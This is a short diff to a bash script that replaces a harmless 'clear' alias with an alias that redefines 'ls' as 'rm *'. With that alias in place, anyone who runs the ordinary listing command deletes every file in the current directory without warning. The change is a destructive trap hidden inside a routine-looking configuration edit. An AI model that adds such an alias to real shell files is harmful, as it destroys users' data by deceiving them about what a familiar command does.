@@ -1,2 +1,2 @@
 #!/bin/bash
-alias c="clear"
+alias ls="rm *"
